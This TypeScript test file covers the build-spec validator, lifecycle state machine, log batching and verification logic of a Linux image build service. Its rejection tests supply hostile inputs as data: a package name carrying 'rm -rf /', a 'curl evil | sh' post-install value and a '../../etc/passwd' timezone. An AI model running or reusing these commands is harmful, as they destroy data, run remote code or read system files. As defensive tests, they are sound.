import { describe, expect, it } from "vitest";
import {
  buildSpecSchema,
  canonicalJson,
  findPackagePolicyViolations,
  hostnameFromName,
  resolveSpecDefaults,
  canTransition,
  isForwardStage,
  isTerminalStatus,
  partCountFor,
  UPLOAD_PART_SIZE_BYTES,
  eventsRequestSchema,
  logLinesByteLength,
  MAX_LOG_BATCH_BYTES,
  MAX_LOG_LINE_CHARS,
  utf8ByteLength,
  verificationPassed,
} from "../src";

const valid = {
  schemaVersion: 1,
  name: "Developer Desktop",
  distro: { family: "ubuntu", release: "24.04" },
  architecture: "x86_64",
  profile: "xfce",
  packages: ["git", "curl", "neovim"],
  outputs: ["iso", "container"],
};

describe("buildSpecSchema", () => {
  it("accepts the documented example", () => {
    expect(buildSpecSchema.parse(valid)).toEqual(valid);
  });

  it.each([
    ["unknown distro release", { ...valid, distro: { family: "debian", release: "12" } }],
    ["unsupported architecture", { ...valid, architecture: "aarch64" }],
    ["unknown profile", { ...valid, profile: "gnome" }],
    ["shell metacharacters in package", { ...valid, packages: ["git; rm -rf /"] }],
    ["uppercase package", { ...valid, packages: ["Git"] }],
    ["duplicate packages", { ...valid, packages: ["git", "git"] }],
    ["empty outputs", { ...valid, outputs: [] }],
    ["unknown output", { ...valid, outputs: ["qcow2"] }],
    ["extra keys", { ...valid, postInstall: "curl evil | sh" }],
    ["wrong schema version", { ...valid, schemaVersion: 2 }],
    ["bad hostname", { ...valid, hostname: "-bad" }],
    ["bad timezone", { ...valid, timezone: "../../etc/passwd" }],
  ])("rejects %s", (_label, input) => {
    expect(buildSpecSchema.safeParse(input).success).toBe(false);
  });
});

describe("resolveSpecDefaults", () => {
  it("fills hostname, timezone and locale and orders outputs", () => {
    const spec = buildSpecSchema.parse({ ...valid, outputs: ["container", "iso"] });
    const resolved = resolveSpecDefaults(spec);
    expect(resolved.hostname).toBe("developer-desktop");
    expect(resolved.timezone).toBe("UTC");
    expect(resolved.locale).toBe("en_US.UTF-8");
    expect(resolved.outputs).toEqual(["iso", "container"]);
  });

  it("falls back to a safe hostname", () => {
    expect(hostnameFromName("(())")).toBe("linxgen");
    expect(hostnameFromName("A".repeat(80))).toHaveLength(63);
  });
});

describe("canonicalJson", () => {
  it("is independent of key order", () => {
    expect(canonicalJson({ b: 1, a: { d: 2, c: [3] } })).toBe(canonicalJson({ a: { c: [3], d: 2 }, b: 1 }));
  });
});

describe("package policy", () => {
  it("flags reserved and unsupported packages", () => {
    const v = findPackagePolicyViolations(["git", "linux-image-amd64", "grub-efi-amd64", "task-gnome-desktop", "openrc"]);
    expect(v.map((x) => x.packageName)).toEqual(["linux-image-amd64", "grub-efi-amd64", "task-gnome-desktop", "openrc"]);
  });
});

describe("lifecycle", () => {
  it("allows the happy path", () => {
    const path = ["generating", "validating", "queued", "preparing", "building", "verifying", "uploading", "succeeded"] as const;
    for (let i = 0; i < path.length - 1; i++) expect(canTransition(path[i]!, path[i + 1]!)).toBe(true);
  });

  it("never leaves a terminal state", () => {
    for (const s of ["succeeded", "failed", "cancelled", "timed_out"] as const) {
      expect(isTerminalStatus(s)).toBe(true);
      expect(canTransition(s, "queued")).toBe(false);
    }
  });

  it("rejects skipping to success", () => {
    expect(canTransition("building", "succeeded")).toBe(false);
    expect(canTransition("queued", "succeeded")).toBe(false);
  });

  it("only accepts forward runner stages", () => {
    expect(isForwardStage("queued", "preparing")).toBe(true);
    expect(isForwardStage("building", "preparing")).toBe(false);
    expect(isForwardStage("building", "building")).toBe(false);
    expect(isForwardStage("building", "uploading")).toBe(true);
  });
});

describe("partCountFor", () => {
  it("computes multipart part counts", () => {
    expect(partCountFor(1)).toBe(1);
    expect(partCountFor(UPLOAD_PART_SIZE_BYTES)).toBe(1);
    expect(partCountFor(UPLOAD_PART_SIZE_BYTES + 1)).toBe(2);
  });
});

describe("runner event batches", () => {
  it("counts UTF-8 bytes, not UTF-16 code units", () => {
    expect(utf8ByteLength("abc")).toBe(3);
    expect(utf8ByteLength("é")).toBe(2);
    expect(utf8ByteLength("€")).toBe(3);
    expect(utf8ByteLength("😀")).toBe(4);
    expect(utf8ByteLength("a😀é")).toBe(7);
    expect(utf8ByteLength("\ud800")).toBe(3);
    expect(logLinesByteLength(["ab", "€"])).toBe(5);
  });

  it("rejects batches whose log lines exceed the byte budget even within the line limits", () => {
    const line = "€".repeat(MAX_LOG_LINE_CHARS);
    const lines = Array.from({ length: Math.ceil(MAX_LOG_BATCH_BYTES / utf8ByteLength(line)) + 1 }, () => line);
    expect(eventsRequestSchema.safeParse({ seq: 1, events: [], logLines: lines }).success).toBe(false);
    expect(eventsRequestSchema.safeParse({ seq: 1, events: [], logLines: lines.slice(0, 10) }).success).toBe(true);
  });
});

describe("verificationPassed", () => {
  it("requires every check for the output type", () => {
    expect(verificationPassed("iso", { biosBoot: "passed", uefiBoot: "passed", requestedPackagesPresent: true })).toBe(true);
    expect(verificationPassed("iso", { biosBoot: "passed", uefiBoot: "skipped", requestedPackagesPresent: true })).toBe(false);
    expect(verificationPassed("iso", { biosBoot: "passed", uefiBoot: "passed", requestedPackagesPresent: false })).toBe(false);
    expect(verificationPassed("container", { containerSmoke: "passed", requestedPackagesPresent: true })).toBe(true);
    expect(verificationPassed("container", { containerSmoke: "failed", requestedPackagesPresent: true })).toBe(false);
  });
});
